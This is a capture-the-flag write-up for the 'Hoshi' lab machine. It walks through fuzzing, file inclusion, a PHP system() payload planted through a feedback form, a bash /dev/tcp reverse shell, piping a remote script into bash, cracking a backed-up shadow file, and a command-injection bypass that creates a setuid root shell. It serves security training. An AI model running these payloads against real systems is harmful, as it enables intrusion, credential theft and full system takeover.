# Hoshi

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.27:22
Open 10.0.2.27:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.27

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/img/QQ.png
|_http-title: \xE5\x95\x86\xE5\x93\x81\xE5\x8F\x8D\xE9\xA6\x88 - \xE6\x98\x9F\xE9\x99\x85\xE5\x95\x86\xE5\x9F\x8E
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

On main page there's a Feedback Message Board which has a form to submit, some examples txt files and most importantly a domain.

![writeup.png](/assets/pentest/hackmyvm/hoshi/writeup.png)

Example files: [http://interstellar.dsz/uploads/\_20250827183817.txt](http://interstellar.dsz/uploads/_20250827183817.txt)

### Fuzzing

```bash
‚îî‚îÄ$ feroxbuster -u http://interstellar.dsz -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.html,.txt
200      GET      158l      564w     8734c http://interstellar.dsz/index.php
200      GET       66l      208w     2744c http://interstellar.dsz/admin.php
200      GET        8l       12w      104c http://interstellar.dsz/uploads/_20250827183816.txt
200      GET        8l       12w      104c http://interstellar.dsz/uploads/_20250827183817.txt
200      GET      158l      564w     8734c http://interstellar.dsz/
200      GET     1022l     5263w    85741c http://interstellar.dsz/info.php
200      GET       43l       18w      183c http://interstellar.dsz/robots.txt
200      GET        3l       27w      186c http://interstellar.dsz/sitemap.xml
301      GET        9l       28w      322c http://interstellar.dsz/uploads => http://interstellar.dsz/uploads/
[####################] - 8s     19064/19064   0s      found:9       errors:4
[####################] - 8s     18961/18961   2341/s  http://interstellar.dsz/ 
```

```bash
‚îî‚îÄ$ curl http://interstellar.dsz/sitemap.xml
Admins, please don't use any easily guessable info as passwords.
Simply setting an element to "display:none" is not secure.
Remember to remove debug information completely for security.
```

```bash
‚îî‚îÄ$ curl http://interstellar.dsz/robots.txt -s | grep -v '^$'
User-agent: https://maze-sec.com
Disallow: /img/QQ.png
# Note: `Blind` in the storm, yet stars guide through the `water`.
Sitemap: /sitemap.xml
```

Hmmm... I can't find anything related to `display:none` 
```bash
‚îî‚îÄ$ sudo apt install translate-shell -y
‚îî‚îÄ$ curl -s http://interstellar.dsz/index.php -A 'https://maze-sec.com' | html2markdown | trans -b :en
‚îî‚îÄ$ curl -s http://interstellar.dsz/admin.php -A 'https://maze-sec.com' | html2markdown | trans -b :en
```

If we submit form with full of PHP code something odd happens
```bash
‚îî‚îÄ$ curl 'http://interstellar.dsz/index.php' --data-urlencode 'username=<?php system("id");?>' --data-urlencode 'email=<?php system("id");?>' --data-urlencode 'product=<?php system("id");?>' --data-urlencode 'feedback=<?php system("id");?>'
```

![writeup-1.png](/assets/pentest/hackmyvm/hoshi/writeup-1.png)

Hmmm... Username is the prefix of filename and we can't just inject raw PHP into HTML.

### LFI

After too much fuzzing I got `/hoshi` endpoint
```bash
‚îî‚îÄ$ feroxbuster -u http://interstellar.dsz -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.html,.txt,.xml -a 'https://maze-sec.com'
301      GET        9l       28w      322c http://interstellar.dsz/uploads => http://interstellar.dsz/uploads/
200      GET        3l       27w      186c http://interstellar.dsz/sitemap.xml
200      GET     1022l     5263w    85748c http://interstellar.dsz/info.php
200      GET      170l     1093w    19911c http://interstellar.dsz/
200      GET      170l     1093w    19911c http://interstellar.dsz/index.php
200      GET       66l      208w     2744c http://interstellar.dsz/admin.php
200      GET       43l       18w      183c http://interstellar.dsz/robots.txt
301      GET        9l       28w      320c http://interstellar.dsz/hoshi => http://interstellar.dsz/hoshi/
```

![writeup-2.png](/assets/pentest/hackmyvm/hoshi/writeup-2.png)

Hmmmmmm... the file is 1kb, however only 40 bytes are returned
```bash
‚îî‚îÄ$ curl http://interstellar.dsz/hoshi/gift.php -s -A 'https://maze-sec.com' -i  | trans -b :en
HTTP/1.1 200 OK
Date: Free, 29 Aug 2025 16:11:30 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 40
Content-Type: text/html; charset=UTF-8

<p style='color:red'>illegal file name</p>
```

Interestingly this was not in wordlist, feroxbuster figured it out by itself (?) (...)
```bash
‚îî‚îÄ$ cat /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | grep hoshi -i

```

```bash
‚îî‚îÄ$ ffuf -u 'http://interstellar.dsz/hoshi/gift.php?FUZZ=info.php' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fs 40,301
file                    [Status: 200, Size: 86044, Words: 4282, Lines: 1024, Duration: 167ms]
```

uwu?

![writeup-3.png](/assets/pentest/hackmyvm/hoshi/writeup-3.png)

It seems `file` is rendering anything into `<pre>HERE</pre>`, but not many files work. The public exposed files work in CWD, however not ones in `uploads/`. 
- `uploads` works, but not `uploads/`
- `robots.txt` works, but not `./robots.txt`
- Full path doesn't work `/var/www/html/robots.txt`
- PHP wrappers don't work

1. We can render files
2. We can't render path that contains `..` or `/` (Presumably bad)
3. We get notified if file exists or not
```bash
‚îî‚îÄ$ curl 'http://interstellar.dsz/hoshi/gift.php?file=uploadsfeedbacks.json' -s | html2markdown | trans -b :en
The file does not exist

‚îî‚îÄ$ curl 'http://interstellar.dsz/hoshi/gift.php?file=uploads/feedbacks.json' -s | html2markdown | trans -b :en
Illegal file name
```

We get 500 on binary files, meaning most likely function that reads files is **text based only**
```bash
‚îî‚îÄ$ curl 'http://interstellar.dsz/hoshi/gift.php?file=QQ.png' -i
HTTP/1.0 500 Internal Server Error
Date: Fri, 29 Aug 2025 16:55:34 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 5
Connection: close
Content-Type: text/html; charset=UTF-8

<pre> 
```

Hmm... We are inside `/hoshi` directory, however we can read root level files... :confused:

`uploads` folder was never here, but it's been created by something. 

![writeup-4.png](/assets/pentest/hackmyvm/hoshi/writeup-4.png)

You can append `../` to filenames to place them wherever (OHHH)

Welp, valid idea however it's only rendered as text record :(

![writeup-5.png](/assets/pentest/hackmyvm/hoshi/writeup-5.png)

If we can save file as PHP we are golden, however Null Byte or Newline injections don't work..

```bash
‚îî‚îÄ$ python3 -c $'import urllib.parse, string\nfor c in string.printable:print(urllib.parse.quote(c))' > chars_urlencoded.txt
‚îî‚îÄ$ ffuf -u 'http://interstellar.dsz/hoshi/gift.php?file=FUZZ' -w chars_urlencoded.txt -mc all -fr 'ÈùûÊ≥ïÊñá‰ª∂Âêç' -fs 301
# Allowed: -_.123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

The page loaded via LFI and rendered normally are 2 different things, I thought we could inject PHP into index and then render it but nope, only html remains....

![writeup-6.png](/assets/pentest/hackmyvm/hoshi/writeup-6.png)

### Admin Panel

At this point we need something else. Going back to the `admin.php` we only need "Password" to login. I tried common passwords from rockyou, but it failed. Going for something simpler The Hotline `400-123-4567` as password works! (wtf)

> **Password**: `400-123-4567`

Once logged the note from sitemap.xml becomes useful~~ (kinda)

![writeup-7.png](/assets/pentest/hackmyvm/hoshi/writeup-7.png)

Since the page is statically generated that means we are able to inject PHP code, but there's some WAF that prevents usage of PHP brackets.

![writeup-8.png](/assets/pentest/hackmyvm/hoshi/writeup-8.png)

Filtering only happens on filenames, there's properly injected PHP tags however it doesn't work as PHP code. `<?...?>` gets turned into `<!--?...?-->`

![writeup-9.png](/assets/pentest/hackmyvm/hoshi/writeup-9.png)

When we visit `admin.php` this message is shown, however static page would be HTML. If navigated to [http://interstellar.dsz/admin.html](http://interstellar.dsz/admin.html) the file exists, and every time we submit a form, refresh `admin.php` the `admin.html` page is updated.
```bash
‚îî‚îÄ$ curl http://interstellar.dsz/admin.php -A 'https://maze-sec.com' -d 'password=400-123-4567' -si | grep Cookie
Set-Cookie: PHPSESSID=0pq5g12vsupeegdednif62d897; path=/

‚îî‚îÄ$ curl http://interstellar.dsz/admin.php -A 'https://maze-sec.com' -b 'PHPSESSID=0pq5g12vsupeegdednif62d897' -s | grep display:none | trans -b :en
<div style="display:none" id="static-tip">[debug] Static page has been generated</div></body>
```

The `<?...?>` replace seems to be only relevant in PHP display, HTML renders as is.

```bash
# Create malicious product review
‚îî‚îÄ$ curl 'http://interstellar.dsz/index.php' -d 'feedback=letmein&email=let@me.in&product=DeathStar' --data-urlencode 'username=<?php system($_REQUEST[0]); ?>' -so /dev/null
# Trigger static page generation
‚îî‚îÄ$ curl http://interstellar.dsz/admin.php -b 'PHPSESSID=0pq5g12vsupeegdednif62d897' -so /dev/null
# RCE
‚îî‚îÄ$ curl 'http://interstellar.dsz/hoshi/gift.php?file=admin.html&0=id' -b 'PHPSESSID=0pq5g12vsupeegdednif62d897' -s | html2markdown | grep uid
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![writeup-10.png](/assets/pentest/hackmyvm/hoshi/writeup-10.png)

## Reverse Shell 

```bash
‚îî‚îÄ$ curl 'http://interstellar.dsz/hoshi/gift.php?file=admin.html' -G --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' -b 'PHPSESSID=0pq5g12vsupeegdednif62d897'
---
‚îî‚îÄ$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.27] 43290
bash: cannot set terminal process group (432): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hoshi:/var/www/html/hoshi$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Source Code

As suspected the protocols are disabled manually and `include` function is used to embed files which triggers RCE.
```php
www-data@hoshi:/var/www/html/hoshi$ cat gift.php
<?php

$allow_dir = realpath(__DIR__ . '/../') . '/';
$filename = isset($_GET['file']) ? $_GET['file'] : '';

// Only files in the html directory are allowed, and pseudo-protocols such as '..' and 'php:' are not allowed.
if (
    $filename &&
    strpos($filename, '..') === false &&
    strpos($filename, 'php:') === false &&
    strpos($filename, '://') === false &&
    strpos($filename, 'filter') === false &&
    strpos($filename, 'data:') === false &&
    strpos($filename, 'zip:') === false &&
    strpos($filename, 'phar:') === false &&
    strpos($filename, 'glob:') === false &&
    strpos($filename, 'expect:') === false &&
    strpos($filename, 'input') === false &&
    preg_match('/^[a-zA-Z0-9_\-\.]+$/', $filename)
) {
    $target = $allow_dir . $filename;
    if (file_exists($target)) {
        // Wrap PHP code, demonstrate file inclusion + RCE
        echo "<pre>";
        include($target);
        echo "</pre>";
    } else {
        echo "<p style='color:red'>File does not exist</p>";
    }
} else {
    echo "<p style='color:red'>Invalid file name</p>";
}
?>
```

`admin.php` displays filenames with `htmlspecialchars` in PHP, however the whole file is saved as HTML without it.
```php
www-data@hoshi:/var/www/html$ cat admin.php
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
ob_start();
session_start();

// Configuration
$admin_password = '400-123-4567';
$upload_dir = __DIR__ . '/uploads/';
$metadata_file = $upload_dir . 'feedbacks.json';

// Process the deleted file (must be output before)
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true && isset($_POST['delete_file'])) { ... }

// Handling Logins
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['password'])) { ... }
?>

<!DOCTYPE html>
<html lang="zh-CN">
...
<body class="text-gray-100 font-sans">
    <!-- Navigation bar -->
    <nav class="navbar fixed top-0 left-0 w-full z-50"> ... </nav>

    <div class="container mx-auto p-6 max-w-4xl">
        <h1 class="text-3xl font-semibold text-center mb-8 text-white glow">ÂèçÈ¶àÁÆ°ÁêÜÂêéÂè∞</h1>

        <!-- Login Form -->
        <?php if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) { ?> ... <?php } else ?>

        <!-- Statistics -->
        <div class="bg-gray-800 p-8 rounded-lg glow">
            ...
            <?php
            // Statistical feedback file
            $file_count = 0;
            $total_size = 0;
            $files = glob($upload_dir . '*.txt');
            ...
            foreach ($files as $file) {
                $filename = basename($file);
                $size = filesize($file);
                $file_count++;
                $total_size += $size;
                echo '<tr><td class="py-1 px-2 border-b">' . $filename . '</td>';
                echo '<td class="py-1 px-2 border-b">' . $size . ' B</td>';
                echo '<td class="py-1 px-2 border-b">';
                echo '<form method="POST" style="display:inline" onsubmit="return confirm(\'Á°ÆÂÆöË¶ÅÂà†Èô§Ê≠§Êñá‰ª∂ÂêóÔºü\');">';
                echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($filename) . '">';
                echo '<button type="submit" class="text-red-400 hover:text-red-600 underline">Âà†Èô§</button>';
                echo '</form>';
                echo '</td></tr>';
            }
            ...
            if (count($user_counts) === 0) {
                echo '<li>ÊöÇÊó†Êï∞ÊçÆ</li>';
            } else {
                foreach ($user_counts as $user => $count) {
                    echo '<li>' . htmlspecialchars($user) . ': ' . $count . ' Êù°ÂèçÈ¶à</li>';
                }
            }
            ...
            if (count($product_counts) === 0) {
                echo '<li>ÊöÇÊó†Êï∞ÊçÆ</li>';
            } else {
                foreach ($product_counts as $product => $count) {
                    echo '<li>' . htmlspecialchars($product) . ': ' . $count . ' Êù°ÂèçÈ¶à</li>';
                }
            }
            echo '</ul>';
            ?>
        </div>
        <?php } ?>
    </div>
    ...
    <?php
    // Static page generation (only when logged in)
    if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
        $page_content = ob_get_contents();
        file_put_contents(__DIR__ . '/admin.html', $page_content);
        echo '<div style="display:none" id="static-tip">[debug] Static page generated</div>';
    }
    ob_end_flush();
    ?>
</body>
</html>
```

### Backup

Nothing too interesting with manual enumeration, use linpeas

```bash
# curl, wget, nc are not found, use php
www-data@hoshi:/var/log$ php -r 'echo file_get_contents("http://10.0.2.15/lp.sh");' | bash | tee /tmp/lp.log
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Backup folders
drwxr-xr-x 2 root root 4096 Jun 20 13:03 /var/backups
total 44
-rw-r--r-- 1 root root 23836 Apr 11 22:03 apt.extended_states.0
-rw-r--r-- 1 root root  2556 Apr  4 22:55 apt.extended_states.1.gz
-rw-r--r-- 1 root root  2006 Apr  1 10:05 apt.extended_states.2.gz
-rw-r--r-- 1 root root  1542 Apr  1 03:53 apt.extended_states.3.gz
-rw-r--r-- 1 root root   757 Mar 30 21:29 apt.extended_states.4.gz
-rw-r--r-- 1 root root   943 Mar 30 21:29 shadow~
...

www-data@hoshi:/var/log$ cat /var/backups/shadow~ | grep '\$'
root:$6$TfSlMzl8/eUh9mY0$wVygBx94VuTMRZq016O3IPG2mn1e.MFz2WKK.pACuy/Sa1dTHqu0vWtbTBrt/Q8dIWGBeYrY90ERemhYElKHv1:20190:0:99999:7:::
welcome:$6$geD2QaGnx/AiHPAb$8ihVmhNA1GIUFbAkCuUp.KzsUuzAztIlrYNbPFoyORE9U9dsf/L13AuCNpqkJSxu0HG4ltlhJFJKU2Y1Gj8Sg.:20259:0:99999:7:::
```

```powershell
‚ûú notepad \Users\Public\hashes.txt
welcome:$6$geD2QaGnx/AiHPAb$8ihVmhNA1GIUFbAkCuUp.KzsUuzAztIlrYNbPFoyORE9U9dsf/L13AuCNpqkJSxu0HG4ltlhJFJKU2Y1Gj8Sg.
‚ûú john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
loveme2          (welcome)
```

## SSH (welcome)

::: tip Creds
`welcome:loveme2`
:::

```bash
‚îî‚îÄ$ sshpass -p 'loveme2' ssh welcome@interstellar.dsz
welcome@hoshi:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

```bash
welcome@hoshi:~$ md5sum user.txt
1cc0b04044f080db0845613aa1888870  user.txt
```

## Privilege Escalation (root)

```bash
welcome@hoshi:~$ sudo -l
Matching Defaults entries for welcome on hoshi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on hoshi:
    (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py
```

```bash
welcome@hoshi:~$ cat /root/12345.py
cat: /root/12345.py: Permission denied
welcome@hoshi:~$ sudo /usr/bin/python3 /root/12345.py
Server listening on port 12345...
Connection from ('10.0.2.15', 54526)
--- --- --- --- --- --- --- --- --- --- --- --- --- ---
‚îî‚îÄ$ nc interstellar.dsz 12345
conf> help
=== Configuration Shell ===
?/help          List available commands
q/quit          Exit the shell
read_config     Read server configuration
write_config    Write to server configuration
list_files      List files in /opt directory
check_status    Check server status
exec_cmd        Execute allowed system commands (e.g., whoami, pwd)

conf> exec_cmd id
uid=0(root) gid=0(root) groups=0(root)

conf> exec_cmd 'install -m4777 /bin/bash /tmp/rootbash'
Error: '' not in allowed commands: whoami, pwd, date, id
conf> exec_cmd id; ss
Error: Forbidden characters (;|&<>) detected.
```

After some fuzzing following pattern worked for command execution
```bash
conf> exec_cmd id'$(ls)'
sh: 1: iduser.txt: not found
conf> exec_cmd id'$(install -m4777 /bin/bash /tmp/rootbash)'
uid=0(root) gid=0(root) groups=0(root)
```

```bash
welcome@hoshi:/opt$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(welcome) gid=1000(welcome) euid=0(root) groups=1000(welcome)
rootbash-5.0# cd /root
rootbash-5.0# md5sum root.txt
585122edddb40119b1094a25e1c1c6cd  root.txt
```

### Source Code

Reason why `id'$(ls)` worked is because the `base_cmd` is split with quote (`'`) hence rest of the command line is not checked for malicious commands
```python
def exec_cmd(cmd, client_addr):
    if re.search(r'[;|<>]', cmd):
        log_action(f"Blocked suspicious input: {cmd}", client_addr)
        return "Error: Forbidden characters (;|&<>) detected."

    allowed_cmds = ["whoami", "pwd", "date", "id"]
    base_cmd = cmd.split("'")[0].strip() # <--- 
    if base_cmd not in allowed_cmds:
        log_action(f"Invalid command: {cmd}", client_addr)
        return f"Error: '{base_cmd}' not in allowed commands: {', '.join(allowed_cmds)}"
    try:
        full_cmd = f"sh -c '{cmd}'"
        log_action(f"Executing command: {full_cmd}", client_addr)
        result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=5)
        return result.stdout or result.stderr or "Command executed."
    except subprocess.TimeoutExpired:
        return "Error: Command timed out."
    except Exception as e:
        return f"Error executing command: {str(e)}"
```

### P.S.

```bash
rootbash-5.0# cat congrats.txt
Congratulations, Hacker!

You've successfully pwned this target machine! üéâ
Your skills are top-notch, and you've earned ultimate bragging rights.

Keep hacking, keep learning, and check out more challenges at maze-sec.com!
See you in the next challenge!

- Sublarge
```

Author writeup: [https://7r1umphk.github.io/post/nei-bu-\_hoshi.html](https://7r1umphk.github.io/post/nei-bu-\_hoshi.html)
- Turns out `/hoshi/` was supposed to be discovered via **BlindWaterMark** and going outside the box to external host (odd)